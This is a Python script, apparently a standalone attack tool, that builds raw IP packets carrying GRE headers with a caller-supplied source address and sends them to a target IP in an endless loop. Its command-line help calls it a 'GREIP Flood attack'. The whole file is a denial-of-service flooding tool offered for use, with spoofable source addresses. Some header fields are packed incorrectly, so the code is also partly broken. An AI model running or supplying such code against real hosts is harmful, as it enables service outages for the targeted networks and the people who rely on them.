import socket
import struct
import time
import argparse

def run_greip_flood(target_ip, source_ip):
    payload = b"GREIP Flood Test"

    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    print(f"Starting GREIP Flood from {source_ip} to {target_ip}...")
    while True:
        # Build IP header
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                # Version and IHL
            0,                   # TOS
            20 + len(payload),   # Total length
            54321,               # ID
            0,                   # Fragment offset
            64,                  # TTL
            socket.IPPROTO_GRE,  # Protocol (47 for GRE)
            0,                   # Checksum (calculated automatically by OS)
            socket.inet_aton(source_ip),  # Source IP
            socket.inet_aton(target_ip),  # Destination IP
        )

        # Build GRE header
        gre_header = struct.pack("!HH", 0x0000, len(payload))  # No special flags

        # Combine headers and payload
        packet = ip_header + gre_header + payload

        # Send the packet
        sock.sendto(packet, (target_ip, 0))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run a GREIP Flood attack.")
    parser.add_argument("target_ip", help="The IP address of the target")
    parser.add_argument("source_ip", help="The IP address of the source")
    args = parser.parse_args()
    
    run_greip_flood(args.target_ip, args.source_ip)
